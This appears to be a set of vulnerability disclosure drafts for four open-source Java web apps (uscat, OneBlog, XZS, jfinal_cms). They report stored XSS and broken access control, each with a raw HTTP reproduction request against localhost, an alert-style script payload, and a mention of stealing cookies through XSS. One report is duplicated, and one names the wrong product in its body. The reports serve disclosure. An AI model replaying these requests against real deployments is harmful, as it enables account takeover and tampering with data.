







### 一、

**Title：There is a stored xss vulnerability exists in uscat.**



[Suggested description]
Cross SIte Scripting (XSS) vulnerability exists in uscat. via
a Google search in url:http://localhost:9105/admin/basic.action 



[Vulnerability Type]
Cross Site Scripting (XSS)



[Vendor of Product] //产品供应商
https://github.com/chenniqing/uscat



[Affected Product Code Base] //受影响的产品代码库
*



[Affected Component] //受影响的组件
POST /web_info/save.json HTTP/1.1
Host: localhost:9105
Content-Length: 213
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="92"
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:9105
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:9105/web_info/edit.action
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=955307B507B1FD2D9AE8E69C6EABFB75; navUrl=http://localhost:9105/admin/basic.action
Connection: close

name=Javaex%E8%AE%BA%E5%9D%9B&domain=http%3A%2F%2Fwww.javaex.cn%2F&email=291026192%40qq.com&recordNumber=%E8%8B%8FICP%E5%A4%8718008530%E5%8F%B7&license=1&statisticalCode= your xss payload



[Attack Type] //攻击类型
Remote



[Impact Code execution] //影响代码执行
true

![image-20211229103118116](issues.assets/image-20211229103118116.png)

The input sensitive parameters are not filtered, resulting in malicious code at URL: http://localhost:9105/ After being parsed and executed, all users accessing this URL will be affected.

![image-20211229103754311](issues.assets/image-20211229103754311.png)







### 二、

### 

**Title：There is a stored xss vulnerability exists in uscat.**



[Suggested description]
Cross SIte Scripting (XSS) vulnerability exists in uscat. via
a Google search in url:http://localhost:9105/admin/basic.action ,





[Vulnerability Type]
Cross Site Scripting (XSS)



[Vendor of Product] //产品供应商
https://github.com/chenniqing/uscat



[Affected Product Code Base] //受影响的产品代码库
*



[Affected Component] //受影响的组件

POST /register_setting/save.json HTTP/1.1
Host: localhost:9105
Content-Length: 89
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="92"
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:9105
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:9105/register_setting/edit.action
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=955307B507B1FD2D9AE8E69C6EABFB75; navUrl=http://localhost:9105/admin/basic.action
Connection: close

isAllowRegister=1&closeRegisterMessage= your xss payload



[Attack Type] //攻击类型
Remote



[Impact Code execution] //影响代码执行
true

![image-20211229111503824](issues.assets/image-20211229111503824.png)

XSS payload will be executed on the registration page at the front of the website. Any user who opens the registration page will be affected

url:http://localhost:9105/forum/user_info/register.action

![image-20211229111731199](issues.assets/image-20211229111731199.png)







### 三、

**Title：There is a Insecure Permissions vulnerability exists in OneBlog**



[Suggested description]
Insecure Permissions vulnerability exists in OneBlog.Low level administrators can delete high-level administrators beyond their authority (including administrators with the highest authority).



[Vulnerability Type]
Insecure Permissions



[Vendor of Product] 
https://github.com/zhangyd-c/OneBlog



[Affected Product Code Base] 
<= 2.2.8



[Affected Component] 
POST /user/remove HTTP/1.1
Host: localhost:8086
Content-Length: 5
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="92"
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:8086
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8086/users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: navUrl=http://localhost:9105/admin/basic.action; XSRF-TOKEN=010353a5-cfe1-4fa8-9a28-0b9cfb4ca538; cms_token=c820882773ab4b6b9719916981b3e9b7; JSESSIONID=c45212ed-03a9-499c-810b-cf5c28e4d5b1
Connection: close

ids=3 



[Attack Type] 
Remote





[Vulnerability details]

first, prepare two test accounts with different levels.

Senior administrator admin

![image-20211229164244458](issues.assets/image-20211229164244458.png)

Low level administrator root123

![image-20211229164427567](issues.assets/image-20211229164427567.png)





Step 2: log in to the system with root123 and enter the user management page

![image-20211229165138189](issues.assets/image-20211229165138189.png)

Step 3: click the delete button to directly delete the administrator user admin

![image-20211229165336565](issues.assets/image-20211229165336565.png)

Delete succeeded！

![image-20211229165436233](issues.assets/image-20211229165436233.png)



In addition, you can also use burpsuite to capture packets and delete any user (including yourself) by modifying the value of ids. This is a logical vulnerability because the default secondary rule of the system is that you cannot delete yourself)

The first step is to log in to the background with root123 account and enter user management.

![image-20211229170717287](issues.assets/image-20211229170717287.png)



Step 2: after the packet capturing mode is enabled, click the delete button corresponding to user test

![image-20211229171345364](issues.assets/image-20211229171345364.png)



You can delete any user by modifying the value of IDS. Here, I modify the value of IDS to the value of the currently logged in user.

![image-20211229171533787](issues.assets/image-20211229171533787.png)

Delete succeeded！







### 四、

**Title：There is a Insecure Permissions vulnerability exists in XZS**



[Suggested description]
Insecure Permissions vulnerability exists in uscat.  

The foreground of this open source system is an online examination system, in which there is an unsafe vulnerability in the function of submitting test papers. An attacker can use burpsuite to modify the parameters in the data packet to destroy the real data.

Post： /api/student/exampaper/answer/answerSubmit



[Vulnerability Type]
Insecure Permissions



[Vendor of Product] //产品供应商
https://github.com/mindskip/xzs-mysql



[Affected Product Code Base] //受影响的产品代码库

》=t3.4.0



[Affected Component] //受影响的组件
POST /api/student/exampaper/answer/answerSubmit HTTP/1.1
Host: localhost:8000
Content-Length: 135
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="92"
Accept: application/json, text/plain, */*
X-XSRF-TOKEN: 010353a5-cfe1-4fa8-9a28-0b9cfb4ca538
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
request-ajax: true
Content-Type: application/json
Origin: http://localhost:8000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8000/student/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: navUrl=http://localhost:9105/admin/basic.action; XSRF-TOKEN=010353a5-cfe1-4fa8-9a28-0b9cfb4ca538; cms_token=c820882773ab4b6b9719916981b3e9b7; Hm_lvt_cd8218cd51f800ed2b73e5751cb3f4f9=1640832435; adminUserName=admin; JSESSIONID=WIBLgnVPP4rhIJU3PzYXxEwTHTA5na4PoZADiRaS; studentUserName=test002; Hm_lpvt_cd8218cd51f800ed2b73e5751cb3f4f9=1640835202
Connection: close

{

​	"questionId":null,

​	"doTime":6,

​	answerItems":[

​		{

​			"questionId":1,

​			"content":null,

​			"contentArray":[

​			],

​			"completed":false,

​			"itemOrder":1

​		}

​	],

​	"id":1

}



[Attack Type] //攻击类型
Remote



[Impact Code execution] //影响代码执行
false



Step 1: open the URL: http://localhost:8000/student/index.html#/paper/index , click "start answer".

![image-20211230133206631](issues.assets/image-20211230133206631.png)



The total exam time is 60 minutes. You can see the remaining time displayed in the upper right.

![image-20211230133519117](issues.assets/image-20211230133519117.png)

Step 2: open the burpsuite agent and click the submit button to obtain the packet capture data.

![image-20211230133804919](issues.assets/image-20211230133804919.png)

The value of dotime indicates the number of seconds between the beginning of this test and clicking submit torque, which can be modified to any number.

![image-20211230134153895](issues.assets/image-20211230134153895.png)







### 五、

**Title：There is a stored xss vulnerability exists in jfinal_cms**



[Suggested description]
Cross SIte Scripting (XSS) vulnerability exists in jfinal_cms. via
a Google search in url:http://localhost/jfinal_cms/admin/site/save/5



[Vulnerability Type]
Cross Site Scripting (XSS)



[Vendor of Product] //产品供应商
https://github.com/jflyfox/jfinal_cms



[Affected Product Code Base] //受影响的产品代码库

Less than 5.1 0



[Affected Component] //受影响的组件

POST /jfinal_cms/admin/site/save/5 HTTP/1.1
Host: localhost
Content-Length: 1777
Cache-Control: max-age=0
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="92"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBl1vjLCSUZbB3vef
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://localhost/jfinal_cms/admin/site/edit/5
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

......
------WebKitFormBoundaryBl1vjLCSUZbB3vef
Content-Disposition: form-data; name="model.name"

åå®¢<script>alert("xss")</script>    //your xss payload
------WebKitFormBoundaryBl1vjLCSUZbB3vef
Content-Disposition: form-data; name="model.site_title"

......

------WebKitFormBoundaryBl1vjLCSUZbB3vef--



[Attack Type] //攻击类型
Remote



[Impact Code execution] //影响代码执行
true



![image-20211230142904370](issues.assets/image-20211230142904370.png)



Click the Save button, because the developer does not filter the input parameters, the input malicious code is parsed and executed.

![image-20211230143416524](issues.assets/image-20211230143416524.png)

Test the reflection cookie through XSS again.

![image-20211230143603563](issues.assets/image-20211230143603563.png)



![image-20211230143630795](issues.assets/image-20211230143630795.png)









### 六、

**Title：There is a stored xss vulnerability exists in uscat.**



[Suggested description]
Cross SIte Scripting (XSS) vulnerability exists in uscat. via
a Google search in url:http://localhost:9105/admin/basic.action 



[Vulnerability Type]
Cross Site Scripting (XSS)



[Vendor of Product] //产品供应商
https://github.com/chenniqing/uscat



[Affected Product Code Base] //受影响的产品代码库
*



[Affected Component] //受影响的组件
POST /web_info/save.json HTTP/1.1
Host: localhost:9105
Content-Length: 213
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="92"
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:9105
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:9105/web_info/edit.action
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=955307B507B1FD2D9AE8E69C6EABFB75; navUrl=http://localhost:9105/admin/basic.action
Connection: close

name=Javaex%E8%AE%BA%E5%9D%9B&domain=http%3A%2F%2Fwww.javaex.cn%2F&email=291026192%40qq.com&recordNumber=%E8%8B%8FICP%E5%A4%8718008530%E5%8F%B7&license=1&statisticalCode= your xss payload



[Attack Type] //攻击类型
Remote



[Impact Code execution] //影响代码执行
true
